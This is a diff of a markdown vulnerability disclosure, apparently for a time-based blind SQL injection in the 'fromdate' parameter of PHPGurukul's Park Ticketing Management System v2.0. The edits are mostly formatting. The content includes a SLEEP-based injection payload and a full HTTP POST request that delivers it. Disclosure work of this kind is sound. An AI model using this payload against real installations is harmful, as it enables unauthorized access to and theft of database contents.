@@ -9,12 +9,12 @@ A SQL Injection vulnerability was discovered in the `normal-bwdates-reports-deta
 |-------------------------|----------------------------------------------------------------------------|
 | Product Name            | Park Ticketing Management System Using PHP and MySQL                       |
 | Vendor                  | PHPGurukul                                                                 |
-| Affected Code File      | `normal-bwdates-reports-details.ph`                                       |
+| Affected Code File      | `normal-bwdates-reports-details.php`                                       |
 | Affected Parameter      | `fromdate`                                                                   |
 | Method                  | POST                                                                       |
 | Type                    | Time-based blind SQL Injection                                             |
 | Version                 | v2.0                                                                       |
-| Official Website        | [PHPGurukul PTMS](https://phpgurukul.com/park-ticketing-management-system-using-php-and-mysql/) |
+| Official Website        | https://phpgurukul.com/park-ticketing-management-system-using-php-and-mysql/
 
 ---
 
@@ -39,13 +39,14 @@ A SQL Injection vulnerability was discovered in the `normal-bwdates-reports-deta
      ' AND (SELECT 7005 FROM (SELECT(SLEEP(10)))JmJX)-- QyUxp
      ```
    - ![image](https://github.com/baixiaobi/Park/blob/main/screenshot/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250704105021.png)
-    Transformed into attack payload    
-
+   
+     attack payload    
+```sql
     POST /Park-Ticketing-Management-System-Project/ptms/normal-bwdates-reports-details.php HTTP/1.1
     Host: 127.0.0.1
     Origin: http://127.0.0.1
     Accept-Language: zh-CN,zh;q=0.9
-    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/137.0.0.0 Safari/537.36
     Sec-Fetch-Mode: navigate
     Content-Type: application/x-www-form-urlencoded
     Accept-Encoding: gzip, deflate, br, zstd
@@ -63,8 +64,9 @@ A SQL Injection vulnerability was discovered in the `normal-bwdates-reports-deta
     Content-Length: 45
 
     fromdate=2025-07-04' AND (SELECT 7005 FROM (SELECT(SLEEP(10)))JmJX)-- QyUxp&todate=2025-07-16&submit=
-  
----
+```
+    
+
 
 ## Impact
 - **Data Theft**: Unauthorized access to sensitive database data.  
